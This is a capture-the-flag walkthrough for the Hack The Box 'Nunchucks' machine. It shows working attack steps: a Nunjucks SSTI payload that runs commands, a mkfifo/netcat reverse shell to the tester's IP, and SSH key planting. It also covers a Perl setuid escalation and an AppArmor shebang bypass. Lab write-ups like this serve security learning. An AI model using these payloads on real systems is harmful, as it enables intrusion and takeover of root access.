@@ -1,0 +1,186 @@
+Nunchucks
+
+ 28th October 2021
+ Prepared By: TheCyberGeek
+ Machine Author(s): TheCyberGeek
+ Difficulty: Easy
+ Classification: Official
+Synopsis
+
+Nunchucks is a easy machine that explores a NodeJS-based Server Side Template Injection (SSTI) leading to
+an AppArmor bug which disregards the binary's AppArmor profile while executing scripts that include the
+shebang of the profiled application.
+
+Skills Required
+
+      Web Enumeration
+      Template Injection Knowledge
+      Linux Enumeration
+      Basic AppArmor Knowledge
+
+Skills Learned
+
+      NodeJS Nunjucks SSTI
+      AppArmor Profile Bypass
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.122 | grep ^[0-9] | cut -d '/' -f1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.11.122
+Nmap reveals that OpenSSH and Nginx are listening on their default ports and HTTPS is enabled on the web
+server, the scan also discloses a domain called nunchucks.htb . Lets add that to our /etc/hosts file.
+
+   echo "10.10.11.122 nunchucks.htb" | sudo tee -a /etc/hosts
+
+Nginx
+
+Browsing to port 80, we are redirected to https://nunchucks.htb and discover that the website
+advertises the ability to create web stores through their Software as a Service (SaaS) application.
+
+By clicking Start selling we are redirected to a registration form, although when trying to register we
+see a notice displaying that registration is currently closed.
+Testing the login feature we see a notice stating that user logins are currently disabled.
+
+On the footer of the website we can see site links that states Store: Coming soon! . So we perform
+subdomain enumeration to see if we can find any subdomains.
+
+   gobuster vhost -u https://nunchucks.htb -w /usr/share/wordlists/dirbuster/directory-
+   list-2.3-medium.txt -k
+Now edit the /etc/hosts file and add the new subdomain. Upon exploring the subdomain we see that the
+web store has not been created yet and is coming soon, but allows us to sign up for a newsletter.
+
+SSTI
+
+We can see that after submitting an email address the email address is reflected on the website. Testing the
+for Server Side Template Injection (SSTI) against the target website using the common injections shows that
+the site is vulnerable since 7*7 = 49 .
+Capturing the request in BurpSuite and sending it to repeater tab, we notice that the application is using
+NodeJS Express to handle the web application.
+
+Searching on google shows that there is in fact SSTI vulnerabilties on particular NodeJS template engines
+such as Nunjucks template engine.
+
+Using the proof of concept code for file read from the link here, we are able to execute commands on the
+target.
+
+   {{range.constructor(\"return
+   global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}
+At this stage we start a netcat listener locally.
+
+   nc -lvvp 4444
+
+Then by editing the command to a mkfifo netcat payload, we can gain a shell on the system as David
+user and can read the user.txt in David's home directory.
+
+   {{range.constructor(\"return
+   global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo
+   /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 4444 >/tmp/f')\")()}}
+Privilege Escalation
+
+To get a reliable shell we gain a stable shell and generate a SSH private key.
+
+Copying the key to our localhost and trying to SSH into the target as david we notice that our key doesn't
+work. So we echo our own id_rsa.pub into authorized keys and attempt to gain SSH access again.
+
+   echo <id_rsa.pub> > ~/.ssh/authorized_keys
+   ssh david@nunchucks.htb
+Enumerating the filesystem we see that Perl has setuid capabilities set.
+   getcap -r /
+Visiting GTFObins and looking at the Perl section we see that they do have a capabilities section with a
+proof of concept code. Trying to execute the standard /bin/sh payload seems to do nothing.
+
+   perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+
+Trying to read the shadow file returns permission denied even with setuid enabled.
+   perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "cat /etc/shadow";'
+
+Trying whoami returns that we are root.
+   perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'
+Trying to read the root.txt file also returns permission denied.
+   perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "cat /root/root.txt";'
+
+Enumerating Apparmor profiles we notice the profile for Perl .
+   cat /etc/apparmor.d/usr.bin.perl
+   # Last Modified: Tue Aug 31 18:25:30 2021
+   #include <tunables/global>
+   /usr/bin/perl {
+      #include <abstractions/base>
+      #include <abstractions/nameservice>
+      #include <abstractions/perl>
+      capability setuid,
+      deny owner /etc/nsswitch.conf r,
+      deny /root/* rwx,
+      deny /etc/shadow rwx,
+      /usr/bin/id mrix,
+      /usr/bin/ls mrix,
+      /usr/bin/cat mrix,
+      /usr/bin/whoami mrix,
+      /opt/backup.pl mrix,
+      owner /home/ r,
+      owner /home/david/ r,
+   }
+
+Visiting /opt we see the backup.pl found in the Apparmor profile and execute the file.
+
+Checking the created files we notice that the file is owned by root user in david group.
+
+Checking the backup.pl we see that it has the setuid applied to the script, but we cannot write or make
+any changes to the execution of the script.
+
+#!/usr/bin/perl
+use strict;
+use POSIX qw(strftime);
+use DBI;
+use POSIX qw(setuid);
+POSIX::setuid(0);
+
+my $tmpdir  = "/tmp";
+
+my $backup_main = '/var/www';
+
+my $now = strftime("%Y-%m-%d-%s", localtime);
+   my $tmpbdir = "$tmpdir/backup_$now";
+
+   sub printlog
+   {
+
+          print "[", strftime("%D %T", localtime), "] $_[0]\n";
+   }
+
+   sub archive
+   {
+
+          printlog "Archiving...";
+          system("/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2>/dev/null");
+          printlog "Backup complete in $tmpbdir/backup_$now.tar";
+   }
+
+   if ($> != 0) {
+          die "You must run this script as root.\n";
+
+   }
+
+   printlog "Backup starts.";
+   mkdir($tmpbdir);
+   &archive;
+   printlog "Moving $tmpbdir/backup_$now to /opt/web_backups";
+   system("/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/");
+   printlog "Removing temporary directory";
+   rmdir($tmpbdir);
+   printlog "Completed";
+
+Searching on Google for AppArmor Perl bugs we see a bug tracker at launchpad . According to the bug
+tracker at launchpad , if a script including the shebang of the restricted application is used, then the script
+will not be allocated the same restrictions and will be executed as shown in the link.
+
+Knowing that we can execute scripts with the shebang and they won't apply the AppArmor profile to the
+script, we can simply take the payload from GTFOBins and add it to a script for execution.
+
+   #!/usr/bin/perl
+   use POSIX qw(setuid);
+   POSIX::setuid(0);
+   exec "/bin/bash";
+Then apply permissions and execute the script.
+
